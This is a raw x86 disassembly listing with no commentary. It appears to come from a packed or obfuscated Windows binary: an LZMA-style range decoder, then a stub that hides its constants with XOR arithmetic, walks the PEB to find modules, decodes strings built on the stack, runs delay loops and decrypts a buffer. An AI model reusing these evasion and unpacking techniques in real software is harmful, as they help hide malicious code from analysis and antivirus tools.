  41b227:	call   0x41b419
  41b22c:	mov    esi,DWORD PTR [ebp-0x2c]
  41b22f:	je     0x41b23a
  41b231:	mov    esi,DWORD PTR [ebp-0x30]
  41b234:	mov    ecx,DWORD PTR [ebp-0x2c]
  41b237:	mov    DWORD PTR [ebp-0x30],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp-0x28]
  41b23d:	mov    DWORD PTR [ebp-0x2c],ecx
  41b240:	mov    ecx,DWORD PTR [ebp-0x24]
  41b243:	mov    DWORD PTR [ebp-0x28],ecx
  41b246:	mov    DWORD PTR [ebp-0x24],esi
  41b249:	pop    eax
  41b24a:	pop    edi
  41b24b:	pop    ecx
  41b24c:	mov    edx,0xa68
  41b251:	mov    cl,0x8
  41b253:	add    edx,edi
  41b255:	push   edx
  41b256:	push   edi
  41b257:	cmp    al,0x7
  41b259:	mov    al,cl
  41b25b:	jb     0x41b25f
  41b25d:	add    al,0x3
  41b25f:	push   eax
  41b260:	mov    ebp,DWORD PTR [ebp-0x34]
  41b263:	call   0x41b426
  41b268:	jne    0x41b27e
  41b26a:	mov    eax,DWORD PTR [ebp-0x18]
  41b26d:	mov    edi,DWORD PTR [ebp-0x34]
  41b270:	shl    eax,0x3
  41b273:	sub    ecx,ecx
  41b275:	push   0x8
  41b277:	pop    esi
  41b278:	lea    edi,[edi+eax*2+0x4]
  41b27c:	jmp    0x41b2b3
  41b27e:	mov    ebp,DWORD PTR [ebp-0x34]
  41b281:	add    ebp,0x2
  41b284:	call   0x41b426
  41b289:	jne    0x41b2a3
  41b28b:	mov    eax,DWORD PTR [ebp-0x18]
  41b28e:	mov    edi,DWORD PTR [ebp-0x34]
  41b291:	shl    eax,0x3
  41b294:	push   0x8
  41b296:	pop    ecx
  41b297:	push   0x8
  41b299:	pop    esi
  41b29a:	lea    edi,[edi+eax*2+0x104]
  41b2a1:	jmp    0x41b2b3
  41b2a3:	mov    edi,0x204
  41b2a8:	add    edi,DWORD PTR [ebp-0x34]
  41b2ab:	push   0x10
  41b2ad:	pop    ecx
  41b2ae:	mov    esi,0x100
  41b2b3:	mov    DWORD PTR [ebp-0x1c],ecx
  41b2b6:	sub    eax,eax
  41b2b8:	inc    eax
  41b2b9:	mov    ebp,edi
  41b2bb:	call   0x41b428
  41b2c0:	mov    ecx,eax
  41b2c2:	sub    ecx,esi
  41b2c4:	jb     0x41b2b9
  41b2c6:	add    DWORD PTR [ebp-0x1c],ecx
  41b2c9:	cmp    DWORD PTR [ebp-0x3c],0x4
  41b2cd:	jae    0x41b383
  41b2d3:	add    DWORD PTR [ebp-0x3c],0x7
  41b2d7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b2da:	cmp    ecx,0x4
  41b2dd:	jb     0x41b2e2
  41b2df:	push   0x3
  41b2e1:	pop    ecx
  41b2e2:	mov    edi,DWORD PTR [ebp-0x38]
  41b2e5:	shl    ecx,0x6
  41b2e8:	sub    eax,eax
  41b2ea:	inc    eax
  41b2eb:	push   0x40
  41b2ed:	pop    esi
  41b2ee:	lea    edi,[edi+ecx*2+0x360]
  41b2f5:	mov    ebp,edi
  41b2f7:	call   0x41b428
  41b2fc:	mov    ecx,eax
  41b2fe:	sub    ecx,esi
  41b300:	jb     0x41b2f5
  41b302:	mov    DWORD PTR [ebp-0x18],ecx
  41b305:	mov    DWORD PTR [ebp-0x24],ecx
  41b308:	cmp    ecx,0x4
  41b30b:	jb     0x41b380
  41b30d:	mov    esi,ecx
  41b30f:	and    DWORD PTR [ebp-0x24],0x1
  41b313:	shr    esi,1
  41b315:	or     DWORD PTR [ebp-0x24],0x2
  41b319:	dec    esi
  41b31a:	cmp    ecx,0xe
  41b31d:	jae    0x41b338
  41b31f:	mov    eax,0x2af
  41b324:	sub    eax,ecx
  41b326:	mov    ecx,esi
  41b328:	shl    BYTE PTR [ebp-0x24],cl
  41b32b:	add    eax,DWORD PTR [ebp-0x24]
  41b32e:	shl    eax,1
  41b330:	add    eax,DWORD PTR [ebp-0x38]
  41b333:	mov    DWORD PTR [ebp-0x34],eax
  41b336:	jmp    0x41b365
  41b338:	sub    esi,0x4
  41b33b:	call   0x41b3e5
  41b340:	shr    ebx,1
  41b342:	shl    DWORD PTR [ebp-0x24],1
  41b345:	cmp    DWORD PTR [ebp-0x20],ebx
  41b348:	jb     0x41b350
  41b34a:	inc    DWORD PTR [ebp-0x24]
  41b34d:	sub    DWORD PTR [ebp-0x20],ebx
  41b350:	dec    esi
  41b351:	jne    0x41b33b
  41b353:	mov    eax,0x644
  41b358:	add    eax,DWORD PTR [ebp-0x38]
  41b35b:	mov    DWORD PTR [ebp-0x34],eax
  41b35e:	shl    DWORD PTR [ebp-0x24],0x4
  41b362:	push   0x4
  41b364:	pop    esi
  41b365:	sub    edi,edi
  41b367:	inc    edi
  41b368:	mov    eax,edi
  41b36a:	mov    ebp,DWORD PTR [ebp-0x34]
  41b36d:	call   0x41b428
  41b372:	test   al,0x1
  41b374:	je     0x41b379
  41b376:	or     DWORD PTR [ebp-0x24],edi
  41b379:	shl    edi,1
  41b37b:	dec    esi
  41b37c:	jne    0x41b36a
  41b37e:	jmp    0x41b380
  41b380:	inc    DWORD PTR [ebp-0x24]
  41b383:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b386:	add    ecx,0x2
  41b389:	mov    edi,DWORD PTR [ebp-0x4]
  41b38c:	mov    eax,edi
  41b38e:	sub    eax,DWORD PTR [ebp+0x24]
  41b391:	cmp    DWORD PTR [ebp-0x24],eax
  41b394:	ja     0x41b3e0
  41b396:	mov    esi,edi
  41b398:	sub    esi,DWORD PTR [ebp-0x24]
  41b39b:	mov    edx,DWORD PTR [ebp+0x28]
  41b39e:	lods   al,BYTE PTR ds:[esi]
  41b39f:	stos   BYTE PTR es:[edi],al
  41b3a0:	cmp    edi,edx
  41b3a2:	jae    0x41b3a7
  41b3a4:	dec    ecx
  41b3a5:	jne    0x41b39e
  41b3a7:	mov    DWORD PTR [ebp-0x4],edi
  41b3aa:	movzx  esi,al
  41b3ad:	cmp    edi,DWORD PTR [ebp+0x28]
  41b3b0:	jb     0x41b111
  41b3b6:	call   0x41b3e5
  41b3bb:	sub    eax,eax
  41b3bd:	lea    ebp,[esp+0x3c]
  41b3c1:	mov    edx,DWORD PTR [ebp+0x20]
  41b3c4:	mov    esi,DWORD PTR [ebp-0x8]
  41b3c7:	sub    esi,DWORD PTR [ebp+0x18]
  41b3ca:	mov    DWORD PTR [edx],esi
  41b3cc:	mov    edx,DWORD PTR [ebp+0x2c]
  41b3cf:	mov    edi,DWORD PTR [ebp-0x4]
  41b3d2:	sub    edi,DWORD PTR [ebp+0x24]
  41b3d5:	mov    DWORD PTR [edx],edi
  41b3d7:	leave  
  41b3d8:	pop    ebx
  41b3d9:	pop    esi
  41b3da:	pop    edi
  41b3db:	ret    0x1c
  41b3de:	pop    esi
  41b3df:	pop    eax
  41b3e0:	sub    eax,eax
  41b3e2:	inc    eax
  41b3e3:	jmp    0x41b3bd
  41b3e5:	cmp    ebx,0x1000000
  41b3eb:	jb     0x41b3ee
  41b3ed:	ret    
  41b3ee:	shl    ebx,0x8
  41b3f1:	push   esi
  41b3f2:	mov    esi,DWORD PTR [ebp-0x8]
  41b3f5:	cmp    esi,DWORD PTR [ebp+0x1c]
  41b3f8:	jae    0x41b3de
  41b3fa:	mov    eax,DWORD PTR [ebp-0x20]
  41b3fd:	shl    eax,0x8
  41b400:	lods   al,BYTE PTR ds:[esi]
  41b401:	mov    DWORD PTR [ebp-0x20],eax
  41b404:	mov    DWORD PTR [ebp-0x8],esi
  41b407:	pop    esi
  41b408:	ret    
  41b409:	mov    ecx,DWORD PTR [ebp-0x3c]
  41b40c:	movzx  eax,al
  41b40f:	shl    ecx,0x4
  41b412:	add    eax,DWORD PTR [ebp-0x18]
  41b415:	add    eax,ecx
  41b417:	jmp    0x41b41f
  41b419:	movzx  eax,al
  41b41c:	add    eax,DWORD PTR [ebp-0x3c]
  41b41f:	mov    ebp,DWORD PTR [ebp-0x38]
  41b422:	lea    ebp,[ebp+eax*2+0x0]
  41b426:	sub    eax,eax
  41b428:	lea    ebp,[ebp+eax*2+0x0]
  41b42c:	cmp    ebx,0x1000000
  41b432:	jae    0x41b450
  41b434:	mov    ecx,DWORD PTR [esp+0x38]
  41b438:	shl    DWORD PTR [esp+0x20],0x8
  41b43d:	cmp    ecx,DWORD PTR [esp+0x5c]
  41b441:	jae    0x41b3df
  41b443:	mov    dl,BYTE PTR [ecx]
  41b445:	inc    DWORD PTR [esp+0x38]
  41b449:	shl    ebx,0x8
  41b44c:	mov    BYTE PTR [esp+0x20],dl
  41b450:	mov    ecx,ebx
  41b452:	movzx  edx,WORD PTR [ebp+0x0]
  41b456:	shr    ecx,0xb
  41b459:	imul   ecx,edx
  41b45c:	cmp    DWORD PTR [esp+0x20],ecx
  41b460:	jae    0x41b479
  41b462:	mov    ebx,ecx
  41b464:	mov    ecx,0x800
  41b469:	sub    ecx,edx
  41b46b:	shr    ecx,0x5
  41b46e:	add    WORD PTR [ebp+0x0],cx
  41b472:	add    eax,eax
  41b474:	lea    ebp,[esp+0x40]
  41b478:	ret    
  41b479:	shr    edx,0x5
  41b47c:	sub    DWORD PTR [esp+0x20],ecx
  41b480:	sub    ebx,ecx
  41b482:	sub    WORD PTR [ebp+0x0],dx
  41b486:	add    eax,eax
  41b488:	add    eax,0x1
  41b48b:	lea    ebp,[esp+0x40]
  41b48f:	ret    
  41b490:	push   ebp
  41b491:	mov    ebp,esp
  41b493:	sub    esp,0x104
  41b499:	push   ebx
  41b49a:	push   esi
  41b49b:	push   edi
  41b49c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41b4aa:	mov    eax,DWORD PTR [ebp+0x8]
  41b4ad:	mov    DWORD PTR [ebp+0x8],eax
  41b4b0:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4b3:	mov    ebx,0x7510899
  41b4b8:	xor    ecx,ebx
  41b4ba:	mov    eax,0x3272e0
  41b4bf:	add    ecx,eax
  41b4c1:	mov    DWORD PTR [ebp-0x28],ecx
  41b4c4:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c7:	xor    ecx,ebx
  41b4c9:	add    ecx,eax
  41b4cb:	mov    DWORD PTR [ebp-0x40],ecx
  41b4ce:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4d1:	xor    ecx,ebx
  41b4d3:	add    ecx,eax
  41b4d5:	mov    DWORD PTR [ebp-0x3c],ecx
  41b4d8:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4db:	xor    ecx,ebx
  41b4dd:	add    ecx,eax
  41b4df:	mov    DWORD PTR [ebp-0xa0],ecx
  41b4e5:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  41b4ec:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  41b4f3:	mov    DWORD PTR [ebp-0x4c],0xf89c85bd
  41b4fa:	push   0x25
  41b4fc:	pop    ecx
  41b4fd:	mov    DWORD PTR [ebp-0x2c],ecx
  41b500:	mov    DWORD PTR [ebp-0x2c],ecx
  41b503:	push   0x65
  41b505:	pop    ecx
  41b506:	mov    DWORD PTR [ebp-0x2c],ecx
  41b509:	mov    DWORD PTR [ebp-0x2c],ecx
  41b50c:	mov    DWORD PTR [ebp-0x2c],0x4d
  41b513:	mov    DWORD PTR [ebp-0x2c],0x43
  41b51a:	mov    ecx,DWORD PTR [ebp-0x14]
  41b51d:	xor    ecx,ebx
  41b51f:	add    ecx,eax
  41b521:	mov    DWORD PTR [ebp-0x2c],ecx
  41b524:	mov    ecx,DWORD PTR [ebp-0x14]
  41b527:	xor    ecx,ebx
  41b529:	add    ecx,eax
  41b52b:	mov    DWORD PTR [ebp-0x2c],ecx
  41b52e:	mov    DWORD PTR [ebp-0x24],0x257
  41b535:	mov    DWORD PTR [ebp-0x34],0x35
  41b53c:	mov    DWORD PTR [ebp-0x10],0x79
  41b543:	lea    edi,[ebp-0xe4]
  41b549:	lea    esi,[ebp-0x104]
  41b54f:	call   0x41c169
  41b554:	dec    DWORD PTR [ebp-0x10]
  41b557:	jne    0x41b543
  41b559:	dec    DWORD PTR [ebp-0x34]
  41b55c:	jne    0x41b53c
  41b55e:	dec    DWORD PTR [ebp-0x24]
  41b561:	jne    0x41b535
  41b563:	mov    DWORD PTR [ebp-0x24],0x400d
  41b56a:	mov    eax,DWORD PTR [ebp-0x14]
  41b56d:	xor    eax,ebx
  41b56f:	mov    esi,0x3272e0
  41b574:	add    eax,esi
  41b576:	mov    DWORD PTR [ebp-0x8],eax
  41b579:	mov    eax,DWORD PTR [ebp-0x14]
  41b57c:	and    DWORD PTR [ebp-0x94],0x0
  41b583:	xor    eax,ebx
  41b585:	add    eax,esi
  41b587:	mov    DWORD PTR [ebp-0x38],eax
  41b58a:	mov    eax,fs:0x18
  41b590:	mov    DWORD PTR [ebp-0x94],eax
  41b596:	mov    eax,DWORD PTR [eax+0x30]
  41b599:	mov    DWORD PTR [ebp-0x98],eax
  41b59f:	mov    eax,DWORD PTR [eax+0xc]
  41b5a2:	mov    DWORD PTR [ebp-0xc0],eax
  41b5a8:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ab:	lea    ecx,[ebp-0x94]
  41b5b1:	mov    DWORD PTR [eax+0x1a0],ecx
  41b5b7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ba:	lea    ecx,[ebp-0x98]
  41b5c0:	mov    DWORD PTR [eax+0x1a4],ecx
  41b5c6:	mov    eax,DWORD PTR [ebp+0x8]
  41b5c9:	push   DWORD PTR [ebp+0x8]
  41b5cc:	lea    ecx,[ebp-0xc0]
  41b5d2:	mov    DWORD PTR [eax+0x1a8],ecx
  41b5d8:	call   0x41d94f
  41b5dd:	mov    ecx,DWORD PTR [ebp-0x14]
  41b5e0:	xor    ecx,ebx
  41b5e2:	add    ecx,esi
  41b5e4:	cmp    ecx,eax
  41b5e6:	je     0x41b8c3
  41b5ec:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ef:	mov    eax,DWORD PTR [eax+0x194]
  41b5f5:	mov    ecx,DWORD PTR [eax]
  41b5f7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5fa:	mov    eax,DWORD PTR [eax+0x194]
  41b600:	mov    eax,DWORD PTR [eax]
  41b602:	add    eax,DWORD PTR [ecx+0x3c]
  41b605:	mov    ecx,DWORD PTR [ebp+0x8]
  41b608:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41b60e:	lea    edx,[ebp-0xc4]
  41b614:	push   edx
  41b615:	mov    edx,DWORD PTR [ebp+0x8]
  41b618:	mov    edx,DWORD PTR [edx+0x18c]
  41b61e:	mov    edx,DWORD PTR [edx]
  41b620:	add    edx,DWORD PTR [eax+0x88]
  41b626:	push   0x4
  41b628:	push   DWORD PTR [eax+0x8c]
  41b62e:	push   edx
  41b62f:	call   DWORD PTR [ecx+0x1c]
  41b632:	push   DWORD PTR [ebp+0x8]
  41b635:	mov    edi,DWORD PTR [ebp+0x8]
  41b638:	mov    eax,DWORD PTR [ebp+0x8]
  41b63b:	mov    edx,DWORD PTR [eax+0x1b8]
  41b641:	mov    DWORD PTR [ebp-0x68],0x80e0f06
  41b648:	mov    DWORD PTR [ebp-0x64],0x10a051f
  41b64f:	mov    WORD PTR [ebp-0x60],0x7a39
  41b655:	mov    DWORD PTR [ebp-0x90],0x23f0f21
  41b65f:	mov    DWORD PTR [ebp-0x8c],0x6390819
  41b669:	mov    DWORD PTR [ebp-0x88],0x2419020a
  41b673:	mov    DWORD PTR [ebp-0x84],0x81d050d
  41b67d:	mov    DWORD PTR [ebp-0x80],0x7a391f01
  41b684:	mov    DWORD PTR [ebp-0x7c],0x23f0f21
  41b68b:	mov    DWORD PTR [ebp-0x78],0x6390819
  41b692:	mov    DWORD PTR [ebp-0x74],0x2419020a
  41b699:	mov    DWORD PTR [ebp-0x70],0x81d050d
  41b6a0:	mov    DWORD PTR [ebp-0x6c],0x7a131f01
  41b6a7:	call   0x41d97e
  41b6ac:	push   eax
  41b6ad:	mov    eax,DWORD PTR [ebp+0x8]
  41b6b0:	mov    eax,DWORD PTR [eax+0x1a8]
  41b6b6:	push   DWORD PTR [eax]
  41b6b8:	call   0x41d61f
  41b6bd:	test   eax,eax
  41b6bf:	jne    0x41b711
  41b6c1:	mov    eax,DWORD PTR [ebp+0x8]
  41b6c4:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6ca:	mov    edi,DWORD PTR [ebp+0x8]
  41b6cd:	add    eax,0x4
  41b6d0:	mov    DWORD PTR [ebp-0x20],eax
  41b6d3:	mov    eax,DWORD PTR [ebp+0x8]
  41b6d6:	mov    edx,DWORD PTR [eax+0x1b8]
  41b6dc:	call   0x41d97e
  41b6e1:	push   eax
  41b6e2:	mov    eax,DWORD PTR [ebp-0x20]
  41b6e5:	call   DWORD PTR [eax]
  41b6e7:	test   eax,eax
  41b6e9:	jne    0x41b711
  41b6eb:	mov    eax,DWORD PTR [ebp+0x8]
  41b6ee:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6f4:	mov    edi,DWORD PTR [ebp+0x8]
  41b6f7:	add    eax,0x10
  41b6fa:	mov    DWORD PTR [ebp-0x20],eax
  41b6fd:	mov    eax,DWORD PTR [ebp+0x8]
  41b700:	mov    edx,DWORD PTR [eax+0x1b8]
  41b706:	call   0x41d97e
  41b70b:	push   eax
  41b70c:	mov    eax,DWORD PTR [ebp-0x20]
  41b70f:	call   DWORD PTR [eax]
  41b711:	mov    eax,DWORD PTR [ebp-0x14]
  41b714:	mov    ecx,DWORD PTR [ebp-0x24]
  41b717:	xor    eax,ebx
  41b719:	add    eax,esi
  41b71b:	cmp    eax,ecx
  41b71d:	je     0x41b89c
  41b723:	mov    eax,DWORD PTR [ebp-0x18]
  41b726:	xor    eax,ebx
  41b728:	mov    ecx,0xffcd8d20
  41b72d:	sub    ecx,eax
  41b72f:	add    ecx,DWORD PTR [ebp-0x24]
  41b732:	mov    eax,DWORD PTR [ebp-0x8]
  41b735:	cmp    eax,ecx
  41b737:	ja     0x41b89c
  41b73d:	mov    DWORD PTR [ebp-0x34],0x0
  41b744:	push   DWORD PTR [ebp+0x8]
  41b747:	mov    edi,DWORD PTR [ebp+0x8]
  41b74a:	mov    eax,DWORD PTR [ebp+0x8]
  41b74d:	mov    edx,DWORD PTR [eax+0x1b4]
  41b753:	call   0x41d97e
  41b758:	push   eax
  41b759:	mov    eax,DWORD PTR [ebp+0x8]
  41b75c:	mov    eax,DWORD PTR [eax+0x1a8]
  41b762:	push   DWORD PTR [eax]
  41b764:	call   0x41d61f
  41b769:	mov    ecx,DWORD PTR [ebp+0x8]
  41b76c:	mov    ecx,DWORD PTR [ecx+0x19c]
  41b772:	mov    DWORD PTR [ecx],eax
  41b774:	mov    eax,DWORD PTR [ebp+0x8]
  41b777:	mov    edi,DWORD PTR [eax+0x1d8]
  41b77d:	mov    esi,DWORD PTR [ebp+0x8]
  41b780:	xor    eax,eax
  41b782:	lea    edx,[ebp-0x7c]
  41b785:	call   0x41d9b4
  41b78a:	push   eax
  41b78b:	mov    eax,DWORD PTR [ebp+0x8]
  41b78e:	mov    eax,DWORD PTR [eax+0x19c]
  41b794:	push   DWORD PTR [eax]
  41b796:	call   DWORD PTR [edi+0x8]
  41b799:	mov    DWORD PTR [ebp-0x20],eax
  41b79c:	mov    eax,DWORD PTR [ebp+0x8]
  41b79f:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7a5:	mov    esi,DWORD PTR [ebp+0x8]
  41b7a8:	xor    eax,eax
  41b7aa:	lea    edx,[ebp-0x90]
  41b7b0:	call   0x41d9b4
  41b7b5:	push   eax
  41b7b6:	mov    eax,DWORD PTR [ebp+0x8]
  41b7b9:	mov    eax,DWORD PTR [eax+0x19c]
  41b7bf:	push   DWORD PTR [eax]
  41b7c1:	call   DWORD PTR [edi+0x8]
  41b7c4:	and    DWORD PTR [ebp-0x1c],0x0
  41b7c8:	mov    eax,DWORD PTR [ebp-0x1c]
  41b7cb:	and    eax,0x7
  41b7ce:	add    eax,0x31
  41b7d1:	push   eax
  41b7d2:	call   DWORD PTR [ebp-0x20]
  41b7d5:	test   eax,eax
  41b7d7:	jne    0x41b7de
  41b7d9:	and    DWORD PTR [ebp-0x10],eax
  41b7dc:	jmp    0x41b806
  41b7de:	mov    eax,DWORD PTR [ebp+0x8]
  41b7e1:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7e7:	mov    esi,DWORD PTR [ebp+0x8]
  41b7ea:	xor    eax,eax
  41b7ec:	lea    edx,[ebp-0x68]
  41b7ef:	call   0x41d9b4
  41b7f4:	push   eax
  41b7f5:	mov    eax,DWORD PTR [ebp+0x8]
  41b7f8:	mov    eax,DWORD PTR [eax+0x198]
  41b7fe:	push   DWORD PTR [eax]
  41b800:	call   DWORD PTR [edi+0x8]
  41b803:	mov    DWORD PTR [ebp-0x10],eax
  41b806:	inc    DWORD PTR [ebp-0x1c]
  41b809:	cmp    DWORD PTR [ebp-0x1c],0x10
  41b80d:	jb     0x41b7c8
  41b80f:	mov    eax,DWORD PTR [ebp-0x18]
  41b812:	mov    esi,DWORD PTR [ebp+0x8]
  41b815:	xor    eax,ebx
  41b817:	mov    edi,0x3272e0
  41b81c:	add    eax,edi
  41b81e:	lea    edx,[ebp-0xe4]
  41b824:	call   0x41d9b4
  41b829:	push   eax
  41b82a:	mov    eax,DWORD PTR [ebp-0x14]
  41b82d:	mov    esi,DWORD PTR [ebp+0x8]
  41b830:	xor    eax,ebx
  41b832:	add    eax,edi
  41b834:	lea    edx,[ebp-0x104]
  41b83a:	call   0x41d9b4
  41b83f:	push   eax
  41b840:	call   DWORD PTR [ebp-0x10]
  41b843:	mov    ecx,DWORD PTR [ebp-0x14]
  41b846:	xor    ecx,ebx
  41b848:	add    ecx,edi
  41b84a:	cmp    ecx,eax
  41b84c:	jne    0x41b855
  41b84e:	mov    DWORD PTR [ebp-0x34],0x1
  41b855:	mov    eax,DWORD PTR [ebp-0x18]
  41b858:	mov    ecx,DWORD PTR [ebp-0x8]
  41b85b:	xor    eax,ebx
  41b85d:	lea    eax,[eax+ecx*1+0x3272e0]
  41b864:	mov    DWORD PTR [ebp-0x8],eax
  41b867:	mov    eax,DWORD PTR [ebp-0x34]
  41b86a:	test   eax,eax
  41b86c:	je     0x41b880
  41b86e:	mov    eax,DWORD PTR [ebp-0x18]
  41b871:	mov    ecx,DWORD PTR [ebp-0x38]
  41b874:	xor    eax,ebx
  41b876:	lea    eax,[eax+ecx*1+0x3272e0]
  41b87d:	mov    DWORD PTR [ebp-0x38],eax
  41b880:	mov    eax,DWORD PTR [ebp-0x18]
  41b883:	xor    eax,ebx
  41b885:	mov    ecx,0xffcd8d20
  41b88a:	sub    ecx,eax
  41b88c:	add    ecx,DWORD PTR [ebp-0x24]
  41b88f:	mov    eax,DWORD PTR [ebp-0x8]
  41b892:	cmp    eax,ecx
  41b894:	jbe    0x41b73d
  41b89a:	mov    esi,edi
  41b89c:	mov    eax,DWORD PTR [ebp-0x38]
  41b89f:	mov    ecx,DWORD PTR [ebp-0x8]
  41b8a2:	cmp    ecx,eax
  41b8a4:	jne    0x41b8b7
  41b8a6:	push   DWORD PTR [ebp+0x8]
  41b8a9:	lea    eax,[ebp-0x40]
  41b8ac:	push   eax
  41b8ad:	call   0x41e42c
  41b8b2:	mov    DWORD PTR [ebp-0x28],eax
  41b8b5:	jmp    0x41b8c3
  41b8b7:	mov    eax,DWORD PTR [ebp-0x28]
  41b8ba:	mov    ecx,DWORD PTR [ebp-0x18]
  41b8bd:	xor    ecx,ebx
  41b8bf:	add    ecx,esi
  41b8c1:	xor    DWORD PTR [eax],ecx
  41b8c3:	mov    eax,DWORD PTR [ebp-0x14]
  41b8c6:	mov    ecx,DWORD PTR [ebp-0x28]
  41b8c9:	xor    eax,ebx
  41b8cb:	add    eax,esi
  41b8cd:	cmp    eax,ecx
  41b8cf:	je     0x41c047
  41b8d5:	mov    eax,DWORD PTR [ebp-0x14]
  41b8d8:	mov    ecx,DWORD PTR [ebp-0x40]
  41b8db:	xor    eax,ebx
  41b8dd:	add    eax,esi
  41b8df:	cmp    eax,ecx
  41b8e1:	je     0x41c047
  41b8e7:	mov    eax,DWORD PTR [ebp-0x14]
  41b8ea:	xor    eax,ebx
  41b8ec:	add    eax,esi
  41b8ee:	jmp    0x41b90c
  41b8f0:	mov    edi,DWORD PTR [ebp-0x28]
  41b8f3:	mov    cl,al
  41b8f5:	and    cl,0x1f
  41b8f8:	or     dl,0xff
  41b8fb:	sub    dl,cl
  41b8fd:	add    BYTE PTR [edi+eax*1],dl
  41b900:	mov    ecx,DWORD PTR [ebp-0x18]
  41b903:	xor    ecx,ebx
  41b905:	lea    eax,[eax+ecx*1+0x3272e0]
  41b90c:	mov    ecx,DWORD PTR [ebp-0x40]
  41b90f:	cmp    eax,ecx
  41b911:	jb     0x41b8f0
  41b913:	mov    eax,DWORD PTR [ebp-0x40]
  41b916:	mov    DWORD PTR [ebp-0x24],eax
  41b919:	mov    eax,DWORD PTR [ebp-0x28]
  41b91c:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41b923:	mov    DWORD PTR [ebp-0xbc],eax
  41b929:	mov    edi,0xf89c85b8
  41b92e:	mov    DWORD PTR [ebp-0x30],edi
  41b931:	mov    eax,DWORD PTR [ebp-0x38]
  41b934:	xor    eax,ebx
  41b936:	add    eax,esi
  41b938:	mov    DWORD PTR [ebp-0xc],eax
  41b93b:	mov    eax,DWORD PTR [ebp-0x38]
  41b93e:	xor    eax,ebx
  41b940:	add    eax,esi
  41b942:	mov    DWORD PTR [ebp-0x8],eax
  41b945:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41b94c:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41b953:	mov    eax,DWORD PTR [ebp-0x38]
  41b956:	mov    ecx,DWORD PTR [ebp-0x24]
  41b959:	xor    eax,ebx
  41b95b:	add    eax,esi
  41b95d:	cmp    ecx,eax
  41b95f:	je     0x41bb5e
  41b965:	jmp    0x41bb3a
  41b96a:	mov    ecx,DWORD PTR [ebp-0xc]
  41b96d:	mov    eax,DWORD PTR [ebp-0x24]
  41b970:	sub    eax,ecx
  41b972:	mov    ecx,DWORD PTR [ebp-0x48]
  41b975:	xor    ecx,ebx
  41b977:	add    ecx,esi
  41b979:	xor    edx,edx
  41b97b:	div    ecx
  41b97d:	mov    DWORD PTR [ebp-0x8],eax
  41b980:	mov    eax,DWORD PTR [ebp-0x54]
  41b983:	mov    ecx,DWORD PTR [ebp-0x8]
  41b986:	xor    eax,ebx
  41b988:	add    eax,esi
  41b98a:	cmp    ecx,eax
  41b98c:	jbe    0x41b998
  41b98e:	mov    eax,DWORD PTR [ebp-0x54]
  41b991:	xor    eax,ebx
  41b993:	add    eax,esi
  41b995:	mov    DWORD PTR [ebp-0x8],eax
  41b998:	mov    eax,DWORD PTR [ebp-0x48]
  41b99b:	mov    ecx,DWORD PTR [ebp-0x8]
  41b99e:	xor    eax,ebx
  41b9a0:	add    eax,esi
  41b9a2:	imul   eax,ecx
  41b9a5:	mov    DWORD PTR [ebp-0x8],eax
  41b9a8:	mov    eax,DWORD PTR [ebp-0x38]
  41b9ab:	mov    ecx,DWORD PTR [ebp-0x8]
  41b9ae:	xor    eax,ebx
  41b9b0:	add    eax,esi
  41b9b2:	cmp    ecx,eax
  41b9b4:	je     0x41bb28
  41b9ba:	mov    eax,DWORD PTR [ebp-0x8]
  41b9bd:	mov    DWORD PTR [ebp-0x10],eax
  41b9c0:	mov    eax,DWORD PTR [ebp-0xc]
  41b9c3:	add    eax,DWORD PTR [ebp-0xbc]
  41b9c9:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  41b9d0:	mov    DWORD PTR [ebp-0x34],edi
  41b9d3:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41b9dd:	mov    DWORD PTR [ebp-0x8],eax
  41b9e0:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41b9e7:	mov    DWORD PTR [ebp-0x1c],edi
  41b9ea:	mov    eax,DWORD PTR [ebp-0x20]
  41b9ed:	xor    eax,ebx
  41b9ef:	add    eax,esi
  41b9f1:	jmp    0x41bae7
  41b9f6:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41ba00:	mov    DWORD PTR [ebp-0xb8],0xf89c85ad
  41ba0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba0d:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba10:	xor    eax,ebx
  41ba12:	add    eax,esi
  41ba14:	imul   eax,ecx
  41ba17:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba1a:	mov    al,BYTE PTR [eax+ecx*1]
  41ba1d:	mov    BYTE PTR [ebp-0x2],al
  41ba20:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba23:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba26:	xor    eax,ebx
  41ba28:	add    eax,esi
  41ba2a:	imul   eax,ecx
  41ba2d:	mov    ecx,DWORD PTR [ebp-0xa8]
  41ba33:	xor    ecx,ebx
  41ba35:	add    eax,ecx
  41ba37:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba3a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41ba42:	mov    ecx,DWORD PTR [ebp-0xb0]
  41ba48:	xor    ecx,ebx
  41ba4a:	lea    eax,[ecx+eax*1+0x3272e0]
  41ba51:	movzx  ecx,BYTE PTR [ebp-0x2]
  41ba55:	xor    ecx,eax
  41ba57:	mov    BYTE PTR [ebp-0x2],cl
  41ba5a:	mov    al,BYTE PTR [ebp-0x2]
